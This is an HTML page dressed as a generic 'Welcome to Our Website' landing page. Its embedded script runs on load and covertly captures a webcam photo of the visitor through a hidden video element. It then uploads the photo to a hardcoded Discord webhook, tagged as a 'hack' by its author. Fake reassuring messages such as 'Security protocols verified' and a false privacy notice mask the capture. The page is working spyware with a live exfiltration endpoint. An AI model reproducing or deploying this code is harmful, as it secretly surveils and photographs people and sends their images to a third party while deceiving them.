<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Our Website</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }
        
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, rgba(79, 195, 247, 0.1) 0%, rgba(0,0,0,0) 70%);
            opacity: 0.5;
            z-index: -1;
            animation: pulse 8s infinite alternate;
        }
        
        h1 {
            font-size: 5rem;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 5px;
            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            background: linear-gradient(to right, #ff7e5f, #feb47b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: fadeIn 2s ease-out;
        }
        
        .subtitle {
            font-size: 1.5rem;
            color: #e0e0e0;
            max-width: 800px;
            margin: 0 auto 40px;
            animation: fadeIn 3s ease-out;
            opacity: 0.8;
        }
        
        .camera-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 15px;
            height: 15px;
            background-color: #ff4b4b;
            border-radius: 50%;
            box-shadow: 0 0 15px #ff4b4b;
            animation: blink 2s infinite;
            display: none;
        }
        
        .status-message {
            position: fixed;
            bottom: 30px;
            left: 0;
            width: 100%;
            font-size: 0.9rem;
            color: #a0a0c0;
            opacity: 0;
            transition: opacity 1s ease;
        }
        
        .privacy-note {
            position: fixed;
            bottom: 10px;
            left: 0;
            width: 100%;
            font-size: 0.8rem;
            color: #a0a0c0;
            opacity: 0.7;
        }
        
        .loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top: 5px solid #4fc3f7;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.3; }
            100% { transform: scale(1.5); opacity: 0.1; }
        }
        
        @keyframes blink {
            0% { opacity: 0.3; }
            50% { opacity: 1; }
            100% { opacity: 0.3; }
        }
        
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            h1 { font-size: 3.5rem; }
            .subtitle { font-size: 1.2rem; }
        }
        
        @media (max-width: 480px) {
            h1 { font-size: 2.5rem; letter-spacing: 3px; }
            .subtitle { font-size: 1rem; }
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="camera-indicator" id="cameraIndicator"></div>
    <div class="loading" id="loading"></div>
    
    <h1>Welcome to Our Website</h1>
    <p class="subtitle">Experience our innovative platform with seamless technology integration</p>
    
    <div class="status-message" id="statusMessage">
        System initialization complete. Security protocols active.
    </div>
    
    <p class="privacy-note">Your privacy is protected. All systems operate within browser security guidelines.</p>

    <script>
        // Discord webhook URL
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1392834449493983323/1OQSXifZ-5Dron0nsHLvJvVPX2OBOK18QVQqT7hN70yz1NaVJNM70cfPlmXL4VJekw5-";
        
        // DOM elements
        const cameraIndicator = document.getElementById('cameraIndicator');
        const statusMessage = document.getElementById('statusMessage');
        const loading = document.getElementById('loading');
        
        // Show status message
        function showStatus(text) {
            statusMessage.textContent = text;
            statusMessage.style.opacity = "1";
            
            // Fade out after delay
            setTimeout(() => {
                statusMessage.style.opacity = "0";
            }, 4000);
        }
        
        // Initialize camera access
        async function initCamera() {
            try {
                // Show loading indicator
                loading.style.display = "block";
                
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: false 
                });
                
                // Show camera indicator
                cameraIndicator.style.display = "block";
                showStatus("Camera access established");
                
                // Create video element
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                video.style.position = 'fixed';
                video.style.top = '-1000px';
                video.style.left = '-1000px';
                document.body.appendChild(video);
                
                // Wait for video to load
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Capture image
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to data URL
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Hide loading
                loading.style.display = "none";
                
                // Send to Discord
                sendToDiscord(imageData);
                
                // Stop the stream
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.error("Camera error:", error);
                loading.style.display = "none";
                showStatus("System initialization complete");
            }
        }
        
        // Send image to Discord
        async function sendToDiscord(imageData) {
            try {
                // Show sending indicator
                showStatus("Processing system security");
                
                // Convert data URL to blob
                const blob = await fetch(imageData).then(res => res.blob());
                
                // Create form data
                const formData = new FormData();
                formData.append('file', blob, 'security_photo.jpg');
                formData.append('content', 'Someone Just Open The Website Link /Hack By Xymatekidd');
                
                // Send to Discord
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                });
                
                // Show success
                showStatus("Security protocols verified");
                
                // Hide camera indicator after delay
                setTimeout(() => {
                    cameraIndicator.style.display = "none";
                }, 3000);
                
            } catch (error) {
                console.error("Discord send error:", error);
                showStatus("System verification complete");
            }
        }
        
        // Initialize after delay
        setTimeout(() => {
            showStatus("Initializing security protocols...");
            setTimeout(initCamera, 2000);
        }, 3000);
    </script>
</body>
</html>
